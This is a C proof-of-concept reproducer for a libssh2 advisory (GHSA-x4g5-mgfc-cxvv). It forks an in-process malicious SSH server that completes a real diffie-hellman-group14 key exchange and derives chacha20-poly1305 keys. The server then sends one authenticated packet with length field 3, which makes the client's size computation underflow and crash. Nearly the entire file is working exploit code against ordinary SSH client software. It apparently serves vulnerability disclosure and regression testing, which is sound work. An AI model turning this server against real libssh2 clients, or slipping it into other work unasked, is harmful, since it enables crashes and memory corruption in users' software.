/*
 * Reproducer for the chacha20-poly1305 short-packet length underflow
 * (GHSA-x4g5-mgfc-cxvv).
 *
 * Drives a stock libssh2 client (public API only) through a complete
 * SSH handshake against an in-process malicious server running over a
 * socketpair. The server negotiates chacha20-poly1305@openssh.com via
 * diffie-hellman-group14-sha256 with an rsa-sha2-256 host key, then
 * sends one properly authenticated packet whose length field is 3.
 * When the library strips the 4-byte size field from that packet the
 * size computation underflows and the process aborts inside libssh2
 * (AddressSanitizer: negative-size-param).
 *
 * No network access is needed; the server is a forked child talking to
 * the client over a unix socketpair. Only the crafted packet bytes
 * differ from an ordinary, valid server conversation.
 */
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <libssh2.h>

#include <openssl/bn.h>
#include <openssl/core_names.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>

#include "chacha.h"
#include "poly1305.h"

#define SERVER_BANNER "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2"

/* packet_length sent in the malicious packet: 1..3 all underflow when the
   4-byte size field is stripped */
#define EVIL_PACKET_LENGTH 3

static void put32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

static uint32_t get32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* same byte order as ssh2_store_u64() (used for the chacha IV seqno) */
static void put64be(unsigned char *p, uint64_t v)
{
    int i;
    for(i = 0; i < 8; i++)
        p[i] = (unsigned char)(v >> (56 - 8 * i));
}

static void die(const char *what)
{
    fprintf(stderr, "poc server: %s failed (%s)\n", what, strerror(errno));
    _exit(1);
}

static void read_full(int fd, unsigned char *buf, size_t len)
{
    size_t got = 0;
    while(got < len) {
        ssize_t r = read(fd, buf + got, len - got);
        if(r <= 0)
            die("read");
        got += (size_t)r;
    }
}

static void write_full(int fd, const unsigned char *buf, size_t len)
{
    size_t put = 0;
    while(put < len) {
        ssize_t w = write(fd, buf + put, len - put);
        if(w <= 0)
            die("write");
        put += (size_t)w;
    }
}

/* ---- unencrypted SSH packet framing (pre-NEWKEYS) ---- */

static unsigned char *read_packet(int fd, size_t *payload_len)
{
    unsigned char hdr[4];
    unsigned char *buf, *payload;
    uint32_t plen, padlen;

    read_full(fd, hdr, 4);
    plen = get32(hdr);
    if(plen < 5 || plen > 256 * 1024)
        die("packet length");
    buf = malloc(plen);
    if(!buf)
        die("malloc");
    read_full(fd, buf, plen);
    padlen = buf[0];
    if((uint32_t)padlen + 1 > plen)
        die("padding");
    *payload_len = plen - padlen - 1;
    payload = malloc(*payload_len ? *payload_len : 1);
    if(!payload)
        die("malloc");
    memcpy(payload, buf + 1, *payload_len);
    free(buf);
    return payload;
}

static void write_packet(int fd, const unsigned char *payload,
                         size_t payload_len)
{
    size_t plen = payload_len + 1; /* +1 for padding_length byte */
    size_t pad = 8 - ((plen + 4) % 8);
    unsigned char *buf;

    if(pad < 4)
        pad += 8;
    plen += pad;
    buf = malloc(4 + plen);
    if(!buf)
        die("malloc");
    put32(buf, (uint32_t)plen);
    buf[4] = (unsigned char)pad;
    memcpy(buf + 5, payload, payload_len);
    memset(buf + 5 + payload_len, 0, pad);
    write_full(fd, buf, 4 + plen);
    free(buf);
}

/* ---- growable buffer for message building ---- */

struct buf {
    unsigned char *d;
    size_t len, cap;
};

static void buf_put(struct buf *b, const void *p, size_t n)
{
    if(b->len + n > b->cap) {
        b->cap = (b->len + n) * 2 + 64;
        b->d = realloc(b->d, b->cap);
        if(!b->d)
            die("realloc");
    }
    memcpy(b->d + b->len, p, n);
    b->len += n;
}

static void buf_put32(struct buf *b, uint32_t v)
{
    unsigned char t[4];
    put32(t, v);
    buf_put(b, t, 4);
}

static void buf_putstring(struct buf *b, const void *p, size_t n)
{
    buf_put32(b, (uint32_t)n);
    buf_put(b, p, n);
}

static void buf_putmpint(struct buf *b, const BIGNUM *bn)
{
    int n = BN_num_bytes(bn);
    unsigned char tmp[1024];
    int pad;

    if(n < 0 || n > (int)sizeof(tmp))
        die("bignum");
    BN_bn2bin(bn, tmp);
    pad = (n > 0 && (tmp[0] & 0x80)) ? 1 : 0;
    buf_put32(b, (uint32_t)(n + pad));
    if(pad) {
        unsigned char z = 0;
        buf_put(b, &z, 1);
    }
    buf_put(b, tmp, (size_t)n);
}

static void sha256(const unsigned char *d, size_t n, unsigned char *out)
{
    size_t olen = 0;
    if(!EVP_Q_digest(NULL, "SHA256", NULL, d, n, out, &olen) || olen != 32)
        die("sha256");
}

/* ---- server KEXINIT (single algorithm per list, all supported) ---- */

static unsigned char *build_kexinit(size_t *out_len)
{
    static const char *const lists[10] = {
        "diffie-hellman-group14-sha256", /* kex */
        "rsa-sha2-256",                  /* server host key */
        "chacha20-poly1305@openssh.com", /* encryption client -> server */
        "chacha20-poly1305@openssh.com", /* encryption server -> client */
        "hmac-sha2-256",                 /* mac client -> server */
        "hmac-sha2-256",                 /* mac server -> client */
        "none",                          /* compression client -> server */
        "none",                          /* compression server -> client */
        "",                              /* languages client -> server */
        ""                               /* languages server -> client */
    };
    size_t len = 1 + 16 + 1 + 4;
    size_t i, o;
    unsigned char *p;

    for(i = 0; i < 10; i++)
        len += 4 + strlen(lists[i]);
    p = malloc(len);
    if(!p)
        die("malloc");
    o = 0;
    p[o++] = 20; /* SSH_MSG_KEXINIT */
    memset(p + o, 0, 16);
    o += 16;
    for(i = 0; i < 10; i++) {
        size_t l = strlen(lists[i]);
        put32(p + o, (uint32_t)l);
        o += 4;
        memcpy(p + o, lists[i], l);
        o += l;
    }
    p[o++] = 0; /* first_kex_packet_follows */
    put32(p + o, 0);
    o += 4;
    *out_len = o;
    return p;
}

/* RFC 3526 2048-bit MODP group (diffie-hellman-group14) */
static const unsigned char dh_group14_p[256] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05,
    0x98, 0xDA, 0x48, 0x36, 0x1C, 0x55, 0xD3, 0x9A,
    0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96,
    0x1C, 0x62, 0xF3, 0x56, 0x20, 0x85, 0x52, 0xBB,
    0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04,
    0xF1, 0x74, 0x6C, 0x08, 0xCA, 0x18, 0x21, 0x7C,
    0x32, 0x90, 0x5E, 0x46, 0x2E, 0x36, 0xCE, 0x3B,
    0xE3, 0x9E, 0x77, 0x2C, 0x18, 0x0E, 0x86, 0x03,
    0x9B, 0x27, 0x83, 0xA2, 0xEC, 0x07, 0xA2, 0x8F,
    0xB5, 0xC5, 0x5D, 0xF0, 0x6F, 0x4C, 0x52, 0xC9,
    0xDE, 0x2B, 0xCB, 0xF6, 0x95, 0x58, 0x17, 0x18,
    0x39, 0x95, 0x49, 0x7C, 0xEA, 0x95, 0x6A, 0xE5,
    0x15, 0xD2, 0x26, 0x18, 0x98, 0xFA, 0x05, 0x10,
    0x15, 0x72, 0x8E, 0x5A, 0x8A, 0xAC, 0xAA, 0x68,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

static void run_server(int fd)
{
    unsigned char cbanner[256];
    size_t cb = 0;
    size_t ic_len, is_len, ki_len, nk_len;
    unsigned char *ic, *is, *ki, *nk;
    const unsigned char *e_wire;
    size_t e_wire_len;
    BN_CTX *bnctx;
    BIGNUM *p, *g, *y, *f, *e_bn, *k;
    EVP_PKEY_CTX *kctx, *sctx;
    EVP_PKEY *pkey = NULL;
    BIGNUM *rn = NULL, *re = NULL;
    struct buf ks = { 0 }, h = { 0 }, sb = { 0 }, rep = { 0 };
    struct buf t = { 0 }, t2 = { 0 };
    unsigned char H[32], digest[32], *sig;
    size_t siglen = 0;
    unsigned char k1[32], k2[32], key64[64];
    unsigned char seqbuf[8], poly_key[32];
    unsigned char lpt[4], lct[4], ppt[EVIL_PACKET_LENGTH];
    unsigned char pct[EVIL_PACKET_LENGTH], tag[16];
    unsigned char pkt[4 + EVIL_PACKET_LENGTH + 16];
    static const unsigned char one[8] = { 1, 0, 0, 0, 0, 0, 0, 0 };
    struct chacha_ctx mctx, hctx;
    size_t i;

    /* 1. banners */
    write_full(fd, (const unsigned char *)SERVER_BANNER "\r\n",
               strlen(SERVER_BANNER) + 2);
    for(;;) {
        unsigned char c;
        read_full(fd, &c, 1);
        if(cb < sizeof(cbanner))
            cbanner[cb++] = c;
        if(c == '\n')
            break;
    }
    while(cb && (cbanner[cb - 1] == '\r' || cbanner[cb - 1] == '\n'))
        cb--;

    /* 2. client KEXINIT (kept raw for the exchange hash) */
    ic = read_packet(fd, &ic_len);
    if(ic_len < 1 || ic[0] != 20)
        die("kexinit");

    /* 3. server KEXINIT */
    is = build_kexinit(&is_len);
    write_packet(fd, is, is_len);

    /* 4. KEXDH_INIT: byte(30) || mpint e */
    ki = read_packet(fd, &ki_len);
    if(ki_len < 6 || ki[0] != 30)
        die("kexdh_init");
    e_wire = ki + 1; /* hashed verbatim, 4-byte length included */
    e_wire_len = ki_len - 1;

    /* 5. server DH share and shared secret */
    bnctx = BN_CTX_new();
    p = BN_bin2bn(dh_group14_p, (int)sizeof(dh_group14_p), NULL);
    g = BN_new();
    BN_set_word(g, 2);
    y = BN_new();
    if(!BN_rand(y, 256, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY))
        die("bn_rand");
    f = BN_new();
    BN_mod_exp(f, g, y, p, bnctx);
    e_bn = BN_bin2bn(e_wire + 4, (int)e_wire_len - 4, NULL);
    k = BN_new();
    BN_mod_exp(k, e_bn, y, p, bnctx);

    /* 6. ephemeral RSA-2048 host key */
    kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if(!kctx || EVP_PKEY_keygen_init(kctx) <= 0 ||
       EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048) <= 0 ||
       EVP_PKEY_keygen(kctx, &pkey) <= 0)
        die("rsa keygen");
    EVP_PKEY_CTX_free(kctx);
    if(EVP_PKEY_get_bn_param(pkey, OSSL_PKEY_PARAM_RSA_N, &rn) <= 0 ||
       EVP_PKEY_get_bn_param(pkey, OSSL_PKEY_PARAM_RSA_E, &re) <= 0)
        die("rsa params");

    /* K_S = string "ssh-rsa" || mpint e || mpint n */
    buf_putstring(&ks, "ssh-rsa", 7);
    buf_putmpint(&ks, re);
    buf_putmpint(&ks, rn);

    /* 7. exchange hash H = SHA256(V_C || V_S || I_C || I_S || K_S ||
                                   e || f || K) */
    buf_putstring(&h, cbanner, cb);
    buf_putstring(&h, SERVER_BANNER, strlen(SERVER_BANNER));
    buf_putstring(&h, ic, ic_len);
    buf_putstring(&h, is, is_len);
    buf_putstring(&h, ks.d, ks.len);
    buf_put(&h, e_wire, e_wire_len);
    buf_putmpint(&h, f);
    buf_putmpint(&h, k);
    sha256(h.d, h.len, H);

    /* 8. host key signature (rsa-sha2-256 signs SHA256(H)) */
    sha256(H, sizeof(H), digest);
    sctx = EVP_PKEY_CTX_new(pkey, NULL);
    if(!sctx || EVP_PKEY_sign_init(sctx) <= 0 ||
       EVP_PKEY_CTX_set_rsa_padding(sctx, RSA_PKCS1_PADDING) <= 0 ||
       EVP_PKEY_CTX_set_signature_md(sctx, EVP_sha256()) <= 0 ||
       EVP_PKEY_sign(sctx, NULL, &siglen, digest, sizeof(digest)) <= 0)
        die("sign init");
    sig = malloc(siglen);
    if(!sig || EVP_PKEY_sign(sctx, sig, &siglen, digest,
                             sizeof(digest)) <= 0)
        die("sign");
    EVP_PKEY_CTX_free(sctx);

    /* 9. KEXDH_REPLY */
    buf_putstring(&sb, "rsa-sha2-256", 12);
    buf_putstring(&sb, sig, siglen);
    {
        unsigned char t31 = 31;
        buf_put(&rep, &t31, 1);
    }
    buf_putstring(&rep, ks.d, ks.len);
    buf_putmpint(&rep, f);
    buf_putstring(&rep, sb.d, sb.len);
    write_packet(fd, rep.d, rep.len);

    /* 10. NEWKEYS both ways (plaintext) */
    nk = read_packet(fd, &nk_len);
    (void)nk;
    (void)nk_len;
    {
        unsigned char t21 = 21;
        write_packet(fd, &t21, 1);
    }

    /* 11. server->client encryption key: HASH(K||H||"D"||session_id) with
       session_id = H, expanded to the 64 bytes chacha20-poly1305 needs */
    buf_putmpint(&t, k);
    buf_put(&t, H, sizeof(H));
    {
        unsigned char d = 'D';
        buf_put(&t, &d, 1);
    }
    buf_put(&t, H, sizeof(H));
    sha256(t.d, t.len, k1);
    buf_putmpint(&t2, k);
    buf_put(&t2, H, sizeof(H));
    buf_put(&t2, k1, sizeof(k1));
    sha256(t2.d, t2.len, k2);
    memcpy(key64, k1, 32);
    memcpy(key64 + 32, k2, 32);

    /* 12. one authenticated packet with length field EVIL_PACKET_LENGTH.
       This is the 4th server->client packet, so seqno is 3. */
    put32(lpt, EVIL_PACKET_LENGTH);
    ppt[0] = 0; /* padding_length (content never reaches the check) */
    for(i = 1; i < EVIL_PACKET_LENGTH; i++)
        ppt[i] = (unsigned char)(0x40 + i);

    chacha_keysetup(&mctx, key64, 256);
    chacha_keysetup(&hctx, key64 + 32, 256);
    put64be(seqbuf, 3);

    memset(poly_key, 0, sizeof(poly_key));
    chacha_ivsetup(&mctx, seqbuf, NULL);
    chacha_encrypt_bytes(&mctx, poly_key, poly_key, sizeof(poly_key));

    chacha_ivsetup(&hctx, seqbuf, NULL);
    chacha_encrypt_bytes(&hctx, lpt, lct, 4);

    chacha_ivsetup(&mctx, seqbuf, one);
    chacha_encrypt_bytes(&mctx, ppt, pct, EVIL_PACKET_LENGTH);

    memcpy(pkt, lct, 4);
    memcpy(pkt + 4, pct, EVIL_PACKET_LENGTH);
    poly1305_auth(tag, pkt, 4 + EVIL_PACKET_LENGTH, poly_key);
    memcpy(pkt + 4 + EVIL_PACKET_LENGTH, tag, 16);

    write_full(fd, pkt, sizeof(pkt));
    _exit(0);
}

int main(void)
{
    int fds[2] = { -1, -1 };
    pid_t pid;
    LIBSSH2_SESSION *session;
    int rc;

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds)) {
        perror("socketpair");
        return 2;
    }

    pid = fork();
    if(pid < 0) {
        perror("fork");
        return 2;
    }
    if(pid == 0) {
        close(fds[0]);
        run_server(fds[1]);
        /* not reached */
        _exit(0);
    }
    close(fds[1]);

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }
    libssh2_session_set_blocking(session, 1);

    /* pin the algorithms the malicious server offers */
    libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX,
                                "diffie-hellman-group14-sha256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_HOSTKEY,
                                "rsa-sha2-256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS,
                                "chacha20-poly1305@openssh.com");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC,
                                "chacha20-poly1305@openssh.com");

    rc = libssh2_session_handshake(session, fds[0]);
    if(rc) {
        fprintf(stderr, "handshake failed: %d\n", rc);
        libssh2_session_free(session);
        libssh2_exit();
        close(fds[0]);
        while(waitpid(pid, NULL, 0) < 0 && errno == EINTR)
            ;
        return 0;
    }
    fprintf(stderr, "handshake ok, requesting authentication\n");

    /* sends SSH_MSG_SERVICE_REQUEST and reads the reply, which is the
       malicious packet */
    rc = libssh2_userauth_password(session, "user", "password");
    fprintf(stderr, "userauth returned %d (no crash)\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    close(fds[0]);
    while(waitpid(pid, NULL, 0) < 0 && errno == EINTR)
        ;
    return 0;
}
